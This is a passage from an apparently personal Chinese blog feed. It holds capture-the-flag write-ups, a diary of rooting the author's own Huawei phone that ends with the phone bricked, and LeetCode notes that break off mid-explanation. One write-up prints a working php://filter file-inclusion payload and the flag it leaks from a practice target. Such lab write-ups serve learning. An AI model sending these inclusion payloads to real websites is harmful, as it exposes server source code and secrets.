        <content type="html"><![CDATA[<h1>BUUCTF 刷题笔记——day 4</h1><h2 id="ACTF2020-新生赛-Include">[ACTF2020 新生赛]Include</h2><h3 id="启动靶机-10">启动靶机</h3><ul><li>打开靶机，页面只有一行 <em>tips</em> ，并且指向一个链接。</li></ul><p>​<img src="0000.webp" alt=""></p><h3 id="分析页面">分析页面</h3><ul><li><p>点击链接，跳转出的新页面仅有一行 <em>Can you find out the flag?</em> 且上述链接仅在 URL 后添加了 <code>?file=flag.php</code> 。</p><p><img src="0001.webp" alt=""></p></li><li><p>根据 URL 的变化判断为文件包含漏洞，我们只需读取 <code>flag.php</code> 文件即可。</p></li></ul><h3 id="读取文件">读取文件</h3><ul><li><p>查询资料得知，<code>php://filter</code> 与包含函数结合时，<code>php://filter</code> 流会被当作php文件执行。</p><blockquote><p><a href="https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.filter"><strong>php://filter</strong></a></p><ul><li><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code> 、 <code>file()</code> 和 <code>file_get_contents()</code> ， 在数据流内容读取之前没有机会应用其他过滤器。</p></li><li><p><code>php://filter</code> 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>resource=&lt;要过滤的数据流&gt;</code></td><td style="text-align:left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td style="text-align:left"><code>read=&lt;读链的筛选列表&gt;</code></td><td style="text-align:left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td style="text-align:left"><code>write=&lt;写链的筛选列表&gt;</code></td><td style="text-align:left">该参数可选。可以设定一个或多个过滤器名称，以管道符（`</td></tr><tr><td style="text-align:left"><code>&lt;；两个链的筛选列表&gt;</code></td><td style="text-align:left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table></li></ul><div align="right">—— PHP手册</div></blockquote></li><li><p><code>php://filter</code> 需要加上读取代码，比如 <code>read=convert.base64-encode</code> ，用 <code>base64</code> 编码输出，不然会直接当做php代码执行，而无法查看源代码内容。</p></li><li><p>综上，构造<code>Payload</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></li></ul><h3 id="开始夺旗（Flag）-4">开始夺旗（Flag）</h3><ul><li><p>将上述 <code>Payload</code> 加入URL中，得到如下 <code>base64</code> 编码的字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MGFkNTg1NDAtZDc0ZC00MWU4LWJkYjQtMDlmNmUxZTNiZjAxfQo=</span><br></pre></td></tr></table></figure><p><img src="0002.webp" alt=""></p></li><li><p>将 <code>base64</code> 字符解密，得到源代码，其中包含 <code>Flag</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;0ad58540-d74d-41e8-bdb4-09f6e1e3bf01&#125;</span><br></pre></td></tr></table></figure><p><img src="0003.webp" alt=""></p></li><li><p>自此，夺旗成功。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> Web </tag>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刷题笔记——day 3</title>
      <link href="/posts/d0ea5b70/"/>
      <url>/posts/d0ea5b70/</url>
      
        <content type="html"><![CDATA[<h1>BUUCTF 刷题笔记——day 3</h1><h2 id="极客大挑战-2019-Havefun">[极客大挑战 2019]Havefun</h2><h3 id="启动靶机-8">启动靶机</h3><ul><li><p>打开进入如下页面，只有一只小猫在中间，戳它会有反应呢（这不重要）！除此之外，连个可以点的地方都没有~</p><p><img src="000.webp" alt=""></p></li></ul><h3 id="查看源码-2">查看源码</h3><ul><li><p>什么都看不到，所以还是直接查看源码吧。源码好长一段，大部分都是界面设计代码，但是主题代码里有一段瞩目的注释：</p><p><img src="001.webp" alt=""></p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        $cat=$_GET[&#x27;cat&#x27;];</span></span><br><span class="line"><span class="comment">        echo $cat;</span></span><br><span class="line"><span class="comment">        if($cat==&#x27;dog&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            echo &#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>$_GET</code> 变量用于收集来自 <code>method=&quot;get&quot;</code> 的表单中的值。<code>if</code> 语句判断表单中 <code>$cat</code> 变量是否与 <code>dog</code> 相等，相等则输出 <code>Syc&#123;cat_cat_cat_cat&#125;</code> 。虽然不懂有没有什么用，但可以试试看。</p></li></ul><h4 id="测试提示">测试提示</h4><ul><li><p>在 <code>url</code> 后加上 <code>?cat=dog</code> ，回车查看。貌似，答案出来了……</p><p><img src="002.webp" alt=""></p></li></ul><h4 id="开始夺旗（Flag）-2">开始夺旗（Flag）</h4><ul><li>嗯对确实就是刚才得到的答案</li></ul><p>自此，夺旗成功。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手机改造成web服务器计划</title>
      <link href="/posts/f709b35a/"/>
      <url>/posts/f709b35a/</url>
      
        <content type="html"><![CDATA[<h1>手机改造成web服务器计划</h1><h2 id="前言">前言</h2><p>很久以前也算是个刷机狂魔了，大概是小学四五年级的时候吧，手里出现了智能手机，机缘巧合了解到 <code>root</code> ，虽然那时咱连怎么读都不知道，但还是被激起了强烈的兴趣。那个时候网上各种各样的刷机软件可以说是百花齐放了，用过非常多的 <code>root</code> 工具。后来因为“救砖难”而“手机贵”，很久也没在刷过机。</p><p>最近因为深度建站，深深感受到这些网络服务的昂贵，甚至连最基本的 <code>Web服务器</code> 都不是普通零花钱可以支持的。虽然有免费建站方案，但体验确实一般。所以，便萌生了一个奇怪的想法：把我的旧手机改造成一个服务器！（虽然但是，就算改造出来怕是也没有免费方案好用，不过，不重要了，整活才是最快乐的！）</p><h2 id="解BL锁">解BL锁</h2><p>一开始便遇到了困难，没想到，这才几年，刷机貌似像是上个世纪的事，不仅工具少之又少，还要先解开手机产商给加的 <code>BL锁</code> 。什么是 <code>BL锁</code> 呢？</p><blockquote><p>BL锁，是 BootLoader 的简称，就是在操作系统内核运行之前运行的一段小程序。在嵌入式操作系统中，BootLoader 是在操作系统内核运行之前运行。可以初始化硬件设备、建立内存空间映射图，从而将系统的软硬件环境带到一个合适状态，以便为最终调用操作系统内核准备好正确的环境。</p><p>在解开BL锁之前，用户是无法自由进行刷机操作和ROOT操作的。部分手机官方为了保证手机的安全，为手机设置了BL锁，在BL锁未解的情况下，用户是不能自行刷机或获取ROOT权限的。</p><div align="right">—— 百度百科</div></blockquote><p>百度一圈后发现 <code>BL锁</code> 的解锁码是可以通过官方申请得到的，但是这已经是以前的事情，华为早已经关闭解锁码申请通道了 ~ 网上有不少跳过申请解锁码刷机的方案，但试过一圈之后基本都失败了。</p><p>最终还是决定去酷安逛逛，发现了一个正在为网友们免费解华为 <code>BL锁</code> 的大佬 <a href="http://www.coolapk.com/u/3463951">@某贼</a> 。我便跟着研究了一下，大佬的所有步骤都是公开的，而且免费为大家远程读码，为大佬的互联网共享精神鼓掌！</p><p>因为我的机型可以直接使用 <a href="https://hcu-client.com/"><code>HCU client</code></a> （付费软件）获取解锁码，所以直接使用 <code>USB端口逆向工具</code> 让大佬远程帮我获取了。（再次感谢无偿为大家远程读码的 <a href="http://www.coolapk.com/u/3463951">@某贼</a> 大佬）</p><p>我的设备参数：</p><blockquote><p>手机型号：华为荣耀6X（BLN-AL10）</p><p>芯片型号：Kirin 655</p><p>安卓版本：7.0</p><p>UI版本号：5.0.2</p></blockquote><p>本来为 EMUI8，担心版本过高影响解码，毕竟咱也不能浪费别人时间嘛，特意先通过华为手机助手(Hisuite)降级了——新版本的 Hisuite 貌似不支持系统回退，这里用的是 10.0.0.510 版本，在系统更新界面选择其他系统。</p><p>在完成本计划的中途，我也完成了另一部备用机（Red M i K30）的解锁加 ROOT ，不得不吐槽一句，安卓最大的特点就是开源，有很多安卓用户都热爱于安卓极高的可定制性与可玩性，也许厂商是站在安全考虑，但我仍然质疑厂商无限打压用户 ROOT 的行为。而起码在这点上，小米仍然官方开放用户解锁并自带 ROOT 管理，我认为这才是开源该有的样子。</p><h2 id="ROOT">ROOT</h2><p>记得以前经常用 ROOT精灵，KingROOT等工具直接在手机就可以很方便地获取 ROOT权限。让我震惊的是，即使现在的环境，还有不少这类软件存活且保持更新，但是貌似基本都是山寨版的。尝试了很多软件之后，基本都无法完成 ROOT ，许多甚至就是杀毒软件套壳。当然也有极少数风评不错且被广泛证明依然有用的工具，比如 YoRoot ，并且官方支持机型就包括荣耀6X ，正是我需要的！</p><img src="0000.webp" style="zoom: 50%;" /><p>中间有个小插曲，因为临时的软件需求，我又通过系统更新将原先降级的 EMUI5 更新到了 EMUI8 。本以为再次用手机助手回退即可，然而并不支持对解锁手机的回退，无论通过官方还是第三方工具，系统安装的进度条总能完整走完，但手机重启却依然是 EMUI8 。在此期间我也找了很多适配 荣耀6X 的 ROM 包，用于后续刷机。</p><p>不知道是否因为系统更新了的原因，实测我的手机并不能通过 YoRoot 来获取 ROOT 权限。因为没有 ROOT 权限很多其他回退操作无法执行，因此，还是得自己慢慢动手。</p><p>根据小米刷机成功的经验，只需要下载系统卡刷ROM，取出压缩包中的 <code>boot.img</code> 文件，然后在手机中安装面具（magisk），用面具修改 <code>boot.img</code> 文件，再用电脑给手机刷入 TWRP 重启进入并选择安装 <code>boot.img</code> 到 boot 分区，然后重启即可。</p><blockquote><p><strong>TWRP</strong> ：Team Win Recovery Project，是一款易于使用和可以自定义的Recovery。</p></blockquote><p>ROM包准备了不少，先找个适配的 TWRP ，百度上有一键刷入的，也有单个包的，但是无论换多少个，刷入手机的过程都会有以下报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Writing &#x27;recovery&#x27;         FAILED (remote: &#x27;partition length get error&#x27;)</span><br><span class="line"></span><br><span class="line">Booting                    FAILED (remote: &#x27;Command not allowed&#x27;)</span><br></pre></td></tr></table></figure><p>而如果无视直接进入 TWRP 的话，则会显示错误并提示升级系统（依然很有可能是我私自升级系统的原因），毕竟 TWRP 根本没刷进去，可以理解。由于成功以后就没复现这个错误了，因此不放图。</p><p>习惯了百度直接搜索，我过了很久才意识到 TWRP 是有 <a href="https://twrp.me/">官网</a> 的，而且提供各种版本下载，并且还找得到我的机型，只不过，实践证明，依然无法正常刷入。</p><img src="0011.webp" style="zoom: 20%;" /><p>所以，还是对症下药，朝着问题去解决吧。对于 <code>Command not allowed</code> 这个问题，<a href="https://www.getdroidtips.com/fastboot-failed-remote-command-not-allowed/">Get Droid Tips</a> 上有比较详细的解决方案。通过 <a href="https://play.google.com/store/apps/details?id=com.kevintresuelo.treble&amp;hl=en_US&amp;gl=US">Treble Check</a> 这个软件了解到荣耀6X 是仅A分区的，因此应在命令行输入以下代码刷入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash recovery twrp.img</span><br></pre></td></tr></table></figure><p>这个网站也提供了ADB 和 Fastboot 的下载安装，里面的教程解决方案都非常详细周到，但是还是没有解决我的问题，因为还有一个 <code>partition length get error</code> 依然没找到解决方案。</p><p>最终在 <a href="https://forum.xda-developers.com/t/guide-un-brick-huawei-p8-lite-2017-and-maybe-other-devices.3816694/">XDA开发者论坛</a> 中找到了一份华为P8的刷机指南，而我完全符合其中的问题二。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash recovery_ramdisk RECOVERY-V2.img</span><br></pre></td></tr></table></figure><img src="0001.webp" style="zoom:25%;" /><p>按照指示刷入作者分享的包后，我才终于在这部手机上看到 TWRP 的界面。</p><img src="0002.webp" style="zoom:18%;" /><p>在这里也分享一下我能成功刷入的唯一包的 <a href="https://h-t-m.lanzoul.com/iFvMx01s93mj">下载地址</a>。</p><p>接下来就应该刷包了，我提取了 <code>boot.img</code> 并经过面具修改，很快便进入 TWRP 准备安装后成功获取权限了，然而这个 TWRP 根本无法读取手机内存，也就是不能通过手机端直接安装了。于是我临时改为用电脑端命令来刷入，这里参考了 <a href="http://www.coolapk.com/u/3463951">@某贼</a> 分享的华为刷机教程，直接用他提供的命令加上我用面具修改后的 <code>boot.img</code> 执行刷机，然后…</p><img src="0003.webp" style="zoom:7%;" /><p>显然，需要一个 ZIP 文件，而不是我的 <code>boot.img</code> 。然后我才发现 <a href="http://www.coolapk.com/u/3463951">@某贼</a> 的教程中其实提供了一个<a href="https://h-t-m.lanzoul.com/iILGR01sm1zi">刷机包</a>，</p><p>于是我再次在电脑中输入以下代码，稍微修改了一下文件名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb sideload Magisk-20.4(20407).zip</span><br></pre></td></tr></table></figure><p>失败次数过于多，因此即使在大佬教程的加持下，还是非常紧张，小心翼翼按下回车键后，最终：</p><img src="0004.webp" style="zoom:7%;" /><p>还剩最后一步，开机可能会跳出面具的安装，不过我并没有跳出来，可能是装了更新版本的缘故，因为得保持 20.4 版本的面具，还是从刷机包中提取了原来就提供了的 <a href="https://h-t-m.lanzoul.com/iyGyK01sml7a">magisk.apk</a> 。</p><img src="0005.webp" style="zoom:18%;" /><p>到这里，手机就算是正式完成了 ROOT 权限的获取。理论上到这里就可以安装软件成为服务器了，但是我要再深入改造一下，刷入类原生系统，以后有机会直接刷入 Linux 。</p><h2 id="刷类原生系统">刷类原生系统</h2><p>适配 荣耀6X 的类原生系统并不多，我选了 <a href="https://www.mokeedev.com/">魔趣 ROM</a> ，直接在官网的<a href="https://flash.mokeedev.com/">Flash MoKee（刷机工具）</a> 界面即可刷入。然而…</p><img src="0006.webp" style="zoom:7%;" /><p>上回书说到，这部手机怎么都刷不进 TWRP ，最后是在 <a href="https://forum.xda-developers.com/t/guide-un-brick-huawei-p8-lite-2017-and-maybe-other-devices.3816694/">XDA开发者论坛</a> 中找到了一份华为P8的刷机指南，而我完全符合其中的问题二，才通过刷入作者所给的 TWRP 包才能成功。也就是说，这份唯一可行的包是适配华为P9 的，因此在 TWRP 下手机的型号将显示为华为P9 。</p><img src="0007.webp" style="zoom:25%;" /><p>显然，在这种情况下是无法完成刷机的，并且实践证明完全不可行。</p><p>那么有没有一种可能，修改 ROM包的适配机型，这样就不会在开头检查的时候就报错了。负责定义适配机型的文件是位于压缩包中 <code>\META-INF\com\google\android\</code> 下的 <code>updater-script</code> 文件。我们应该删除或者修改 <code>assert</code> 的每一行，在这个文件中只有第一行需要修改，于是我将整行删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(getprop(&quot;ro.product.device&quot;) == &quot;hi6250&quot; || getprop(&quot;ro.build.product&quot;) == &quot;hi6250&quot; || getprop(&quot;ro.product.device&quot;) == &quot;Berlin&quot; || getprop(&quot;ro.build.product&quot;) == &quot;Berlin&quot; || getprop(&quot;ro.product.device&quot;) == &quot;berlin&quot; || getprop(&quot;ro.build.product&quot;) == &quot;berlin&quot; || getprop(&quot;ro.product.device&quot;) == &quot;HWBLN-H&quot; || getprop(&quot;ro.build.product&quot;) == &quot;HWBLN-H&quot; || getprop(&quot;ro.product.device&quot;) == &quot;BLN-L21&quot; || getprop(&quot;ro.build.product&quot;) == &quot;BLN-L21&quot; || getprop(&quot;ro.product.device&quot;) == &quot;BLN-L22&quot; || getprop(&quot;ro.build.product&quot;) == &quot;BLN-L22&quot; || getprop(&quot;ro.product.device&quot;) == &quot;BLN-L24&quot; || getprop(&quot;ro.build.product&quot;) == &quot;BLN-L24&quot; || abort(&quot;E3004: This package is for device: hi6250,Berlin,berlin,HWBLN-H,BLN-L21,BLN-L22,BLN-L24; this device is &quot; + getprop(&quot;ro.product.device&quot;) + &quot;.&quot;););</span><br></pre></td></tr></table></figure><p>接着重新刷入 ROM包，果然正式开始刷入了，确实也应该如此。</p><img src="0008.webp" style="zoom:7%;" /><p>等待刷入完成，重启手机，华为从不让我失望，熟悉的蓝色屏幕照常亮起，是快乐的 <strong>honor</strong> 。然后，便无法进入然后了，系统开始无穷无尽的重启，失败，重启，失败。最后，还是先通过自带的 <code>eRecovery</code> 重装回了 EMUI8 。</p><img src="0009.webp" style="zoom:18%;" /><p>然而， <code>eRecovery</code> 的重装也依然无法进入系统，即使进行用户级恢复出厂设置也无济于事。不过，继续通过 <code>eRecovery</code> 进行工厂级恢复出厂设置顺便清理cache ，再次重启便顺利进入了 EMUI8 。兜兜转转回到了 ROOT 之前的样子，不知为何，有点欣慰。</p><p>熟练地获取 ROOT 权限，问题不大，继续！再从 ROM包上思考问题就有点不现实了，毕竟主要问题还是 TWRP 的版本不对，再深入修改 ROM包还不如干脆直接刷安卓原生系统。因为那篇华为P9 的教程并没有说明 TWRP 的来历，想找到适配荣耀6X 的同款 TWRP 属实是有点困难，于是我还是想到了 <a href="https://twrp.me/">TWRP 官网</a> ，记得里面有一条特殊的说明，推荐在获取 ROOT 权限的条件下使用官方应用刷入。在之前刷包时是为了 ROOT ，所以这条说明的存在就有点尴尬，都 ROOT 了为什么还需要刷 TWRP ，然而现在，他却给出了一个大大的希望。</p><img src="0011.webp" style="zoom:20%;" /><p>思路还不错，过程也非常顺利，但是结果却依然不尽如人意，依然还是老问题。不过难得的希望怎么能就这么放过呢，我还是决定再刷几个其他版本的 TWRP ，也许是版本的问题，毕竟手机这么老了。测试最新的几个版本还是老问题，还是从能下载的最旧的一个版本开始测试，结果…</p><p>我是万万没想到这也能让系统崩溃，刷入过程一切顺利，重启的时候发现，不仅进不去 TWRP ，系统也进不去了。没办法，从头开始吧，再次 <code>eRecovery</code> 重装并恢复出厂设置，重新 ROOT ，准备跟剩下的版本继续死磕到底。</p><p>但是，再次成功进入那版 TWRP 时，我注意到，作者名不是写在这里吗。</p><img src="0010.webp" style="zoom:7%;" /><p>那还死磕什么，直接上 <a href="https://forum.xda-developers.com/">XDA论坛</a> 寻找作者，说不定就有现成的适配 TWRP 的同款包，非常荣幸的是，不仅成功找到了作者，也在他的 <a href="https://forum.xda-developers.com/t/rom-elemental-v2-xgputurbo-gaming-emui-8-0-0-honor-6x-dual-sim.3794079/">一篇文章</a> 中找到了适配于荣耀6x 的 <a href="https://h-t-m.lanzoul.com/iONhb01u1ecj">KingOfMezi 版的 TWRP</a> 。</p><p>于是我又再次刷 TWRP ，获取 ROOT 权限，然后，进魔趣的 <a href="https://flash.mokeedev.com/">Flash MoKee（刷机工具）</a> 界面再次尝试刷 ROM 。</p><img src="0012.webp" style="zoom:25%;" /><p>并不知道什么原因，这次，却无法连接手机了……并且，电脑端显示的依然是华为9 。也就是说，即使从作者那里下的 TWRP 依然不起作用，现在，问题应该出在哪里呢。</p><p>还是刷一个 EMUI8 测试一下，结果这个依然没有成功，但是，再次进入 TWRP 却进不去了。进入 FASTBOOT 发现，竟然给我的手机重新上锁了。甚至，连自带的 eRecovery 都进不去。</p><img src="0013.webp" style="zoom:7%;" /><p>既然上锁了，而且也无法 eRecovery 修复，便想起来 Hisuite 有一个系统修复功能，而且是支持荣耀6X 的，现在是时候发挥它的价值了。</p><img src="0015.webp" style="zoom:20%;" /><p>虽然官方直白地将手机型号标在这里，但是显然他错误方式更直白，还直接去网点解决。</p><img src="0016.webp" style="zoom:20%;" /><p>不过，说到网点，Hisuite 的安装界面就有一行小字：安装网点版本。</p><img src="0014.webp" style="zoom:20%;" /><p>虽然说看着感觉也许是一个高级操作，然而其实：</p><img src="0017.webp" style="zoom:25%;" /><p>华为，你耍我！</p><p>现在可没什么法子了，先解锁手机吧，再次用之前获得的解锁码解锁之后，更大的问题出现了。手机不仅无法进入系统，无法进入 TWRP ，甚至无法进入 FASTBOOT 。这下真的是…麻烦了，喜提黑砖。</p>]]></content>
      
      
      <categories>
          
          <category> 奇奇怪怪 </category>
          
          <category> 手机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> root </tag>
            
            <tag> BL锁 </tag>
            
            <tag> 旧手机 </tag>
            
            <tag> Web服务器 </tag>
            
            <tag> 改造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode 刷题笔记——day 8</title>
      <link href="/posts/c4b120e2/"/>
      <url>/posts/c4b120e2/</url>
      
        <content type="html"><![CDATA[<h1>LeetCode 刷题笔记——day 8</h1><h2 id="11-盛最多水的容器"><a href="https://leetcode-cn.com/problems/container-with-most-water/">11. 盛最多水的容器</a></h2><p>难度：中等</p><p>给你 <code>n</code> 个非负整数 <code>a1，a2，...，a``n</code>，每个数代表坐标中的一个点 <code>(i, ai)</code> 。在坐标内画 <code>n</code> 条垂直线，垂直线 <code>i</code> 的两个端点分别为 <code>(i, ai)</code> 和 <code>(i, 0)</code> 。找出其中的两条线，使得它们与 <code>x</code> 轴共同构成的容器可以容纳最多的水。</p><p>**说明：**你不能倾斜容器。</p><p><strong>示例 1：</strong></p><p><img src="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：[1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出：49 </span><br><span class="line">解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height = [1,1]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height = [4,3,2,1,4]</span><br><span class="line">输出：16</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height = [1,2,1]</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>n == height.length</code></li><li><code>2 &lt;= n &lt;= 105</code></li><li><code>0 &lt;= height[i] &lt;= 104</code></li></ul><h3 id="我的答案-10">我的答案</h3><blockquote><p><strong>思路</strong></p><p>移动左边的索引，同时从大到小遍历右边的索引，若当前右索引对应高度小于上一个，则面积肯定更小，因此可以跳过，遍历的同时保存最大面积，最后输出即可。</p><p>然而，这里依然是非常粗暴的解题，因此效率还是非常慢，即使我已经自信满满地增加了排除语句。在测试失败之后我才意识到，原来测试数据能离谱到这种地步，五万字数的数组，实在让我一时不知改如何升级代码了，因此这里直接贴出我的失败代码。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maX = <span class="number">0</span>, n = height.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> miN, s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = n - <span class="number">1</span>; j &gt; i ; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j != n - <span class="number">1</span> &amp;&amp; height[j] &lt; height[j + <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">                miN = height[j] &lt; height[i] ? height[j] : height[i];</span><br><span class="line">                s = (j - i) * miN;</span><br><span class="line">                maX = maX &gt; s ? maX : s;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maX;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>超时了！</li><li>超时了！</li></ul><p>思考挺长时间了，尝试了一下双指针法，总感觉怪怪的，没写下去，参考学习一下官方的题解吧（正好，官方提供的也是双指针法）：</p><h3 id="官方答案-11">官方答案</h3><h4 id="双指针">双指针</h4><blockquote><p><strong>说明</strong></p><p>本题是一道经典的面试题，最优的做法是使用「双指针」。如果读者第一次看到这题，不一定能想出双指针的做法。</p><p><strong>分析</strong></p><p>我们先从题目中的示例开始，一步一步地解释双指针算法的过程。稍后再给出算法正确性的证明。</p><p>题目中的示例为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1, 8, 6, 2, 5, 4, 8, 3, 7]</span><br><span class="line"> ^                       ^</span><br></pre></td></tr></table></figure><p>在初始时，左右指针分别指向数组的左右两端，它们可以容纳的水量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>8</mn><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">\min(1, 7) * 8 = 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span>。</p><p>此时我们需要移动一个指针。移动哪一个呢？直觉告诉我们，应该移动对应数字较小的那个指针（即此时的左指针）。这是因为，由于容纳的水量是由</p><center>两个指针指向的数字中较小值 * 指针之间的距离</center><p>决定的。如果我们移动数字较大的那个指针，那么前者「两个指针指向的数字中较小值」不会增加，后者「指针之间的距离」会减小，那么这个乘积会减小。因此，我们移动数字较大的那个指针是不合理的。因此，我们移动 <strong>数字较小的那个指针</strong>。</p><blockquote><p>有读者可能会产生疑问：<strong>我们可不可以同时移动两个指针？</strong> 先别急，我们先假设 <strong>总是移动数字较小的那个指针</strong> 的思路是正确的，在走完流程之后，我们再去进行证明。</p></blockquote><p>所以，我们将左指针向右移动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1, 8, 6, 2, 5, 4, 8, 3, 7]</span><br><span class="line">    ^                    ^</span><br></pre></td></tr></table></figure><p>此时可以容纳的水量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mn>8</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>7</mn><mo>=</mo><mn>49</mn></mrow><annotation encoding="application/x-tex">\min(8, 7) * 7 = 49</annotation></semantics></math></span><span class="katex-html" 